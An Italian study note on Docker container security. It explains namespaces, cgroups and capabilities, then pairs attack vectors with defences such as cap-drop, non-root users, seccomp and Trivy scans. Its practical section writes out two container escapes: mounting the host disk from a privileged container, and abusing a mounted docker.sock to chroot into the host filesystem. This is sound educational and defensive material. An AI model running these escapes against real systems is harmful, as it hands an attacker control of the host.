---
tipo: concetto
tag: [cloud, linux, tool]
fase: 3
fonti: 3
aggiornato: 2026-06-26
stato: maturo
aliases: ["Container Security (Docker)"]
---

# Container Security (Docker)

## Definizione
Un **container** è un processo isolato dal resto del sistema tramite primitive del kernel Linux —
**namespace** (isolamento di vista: PID, NET, MNT, USER...) e **cgroups** (limiti di risorse) — più
**capabilities** e **seccomp/AppArmor** per restringere le syscall. **Non è una VM**: condivide il
kernel dell'host. Quindi la sicurezza del container è, in ultima analisi, sicurezza del kernel
condiviso: un **container escape** porta direttamente sull'host.

## Meccanismo: dove si rompe l'isolamento
- **Container privilegiato** (`--privileged`): rimuove quasi tutte le restrizioni → escape banale.
- **Socket Docker montato** (`/var/run/docker.sock`): chi lo raggiunge controlla il demone =
  controlla l'host (avvia un container che monta `/`).
- **Capabilities pericolose**: `CAP_SYS_ADMIN`, `CAP_SYS_PTRACE`, `CAP_DAC_READ_SEARCH`.
- **Mount sensibili**: host filesystem, `/proc`, dispositivi.
- **Immagini**: segreti hard-coded nei layer, base image con CVE, immagini non firmate.

## Esempio pratico — enumerazione ed escape
```bash
# Sono in un container? Indizi classici
cat /proc/1/cgroup        # presenza di "docker"/"kubepods"
ls -la /.dockerenv        # file sentinella
capsh --print             # capabilities correnti

# Escape 1: container privilegiato -> monto il disco dell'host
fdisk -l
mkdir /mnt/host && mount /dev/sda1 /mnt/host && chroot /mnt/host

# Escape 2: docker.sock montato dentro il container
docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host sh

# Build sicura: utente non-root nell'immagine
# Dockerfile:
#   RUN adduser -D app && USER app
```

## Attacco / Difesa
| Vettore d'attacco | Contromisura difensiva |
|---|---|
| `--privileged` | Vietarlo; default no-new-privileges |
| `docker.sock` montato | Non montare mai il socket nei container; usare rootless/socket proxy |
| Capabilities eccessive | `--cap-drop=ALL` e aggiungere solo il minimo necessario |
| Container come root | `USER` non-root nel Dockerfile, **user namespace remap** |
| Immagini vulnerabili / con segreti | Scan (Trivy/Grype), distroless/minimal base, secret fuori dall'immagine |
| Syscall pericolose | Profili **seccomp** e **AppArmor**/SELinux attivi |

```bash
# Scansione vulnerabilità immagine
trivy image nginx:latest
# Esecuzione hardened
docker run --rm --cap-drop=ALL --security-opt=no-new-privileges \
  --read-only --user 1000:1000 myimage
```

## Lab
- **TryHackMe** — room *Intro to Containerisation*, *Docker Rodeo*
- **OWASP — Docker Security Cheat Sheet** — https://cheatsheetseries.owasp.org/cheatsheets/Docker_Security_Cheat_Sheet.html
- **Trivy** — https://github.com/aquasecurity/trivy / **Docker Bench** — https://github.com/docker/docker-bench-security
- **HackTricks — Docker Breakout / Privesc** — https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/docker-security/index.html

> [!warning] Etica
> Prova escape e abuso del socket Docker **solo** su host/container di tua proprietà o in lab. Un
> escape ti dà controllo dell'host: trattalo come un'azione altamente privilegiata.

## Collegamenti
- [[Kubernetes Security (RBAC, escape)]]
- [[Privilege Escalation Linux]]
- [[Fondamenti Cloud e Shared Responsibility]]
- [[Logging e Detection Cloud (CloudTrail)]]

## Fonti
- Docker — Security documentation: https://docs.docker.com/engine/security/
- OWASP — Docker Security Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Docker_Security_Cheat_Sheet.html
- HackTricks — Docker Breakout: https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/docker-security/index.html
